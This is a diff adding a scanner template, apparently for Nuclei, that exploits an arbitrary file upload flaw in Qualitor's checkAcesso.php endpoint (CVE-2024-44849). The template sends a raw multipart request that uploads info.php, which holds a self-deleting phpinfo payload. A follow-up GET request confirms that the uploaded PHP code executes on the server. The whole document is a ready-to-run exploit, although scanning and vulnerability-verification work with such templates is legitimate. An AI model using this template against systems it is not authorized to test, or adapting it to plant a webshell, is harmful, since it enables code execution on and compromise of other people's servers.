@@ -1,0 +1,86 @@
+id: poc-zw7g51uctxggnex1
+info:
+  name: Qualitor-checkAcesso任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zw7g51uctxggnex1'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zw7g51uctxggnex1
+http:
+- raw:
+  - 'POST /html/ad/adfilestorage/request/checkAcesso.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: multipart/form-data; boundary=---------------------------QUALITORspaceCVEspace2024space44849
+
+
+    -----------------------------QUALITORspaceCVEspace2024space44849
+
+    Content-Disposition: form-data; name="idtipo"
+
+
+    2
+
+    -----------------------------QUALITORspaceCVEspace2024space44849
+
+    Content-Disposition: form-data; name="nmfilestorage"
+
+
+    -----------------------------QUALITORspaceCVEspace2024space44849
+
+    Content-Disposition: form-data; name="nmdiretoriorede"
+
+
+    .
+
+    -----------------------------QUALITORspaceCVEspace2024space44849
+
+    Content-Disposition: form-data; name="nmbucket"
+
+
+    -----------------------------QUALITORspaceCVEspace2024space44849
+
+    Content-Disposition: form-data; name="nmaccesskey"
+
+
+    -----------------------------QUALITORspaceCVEspace2024space44849
+
+    Content-Disposition: form-data; name="nmkeyid"
+
+
+    -----------------------------QUALITORspaceCVEspace2024space44849
+
+    Content-Disposition: form-data; name="fleArquivo"; filename="info.php"
+
+
+    <?php phpinfo();unlink(__FILE__);?>
+
+    -----------------------------QUALITORspaceCVEspace2024space44849
+
+    Content-Disposition: form-data; name="cdfilestorage"
+
+
+    -----------------------------QUALITORspaceCVEspace2024space44849--
+
+    上传定位：'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /html/ad/adfilestorage/request/info.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+    Content-Length: 0'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
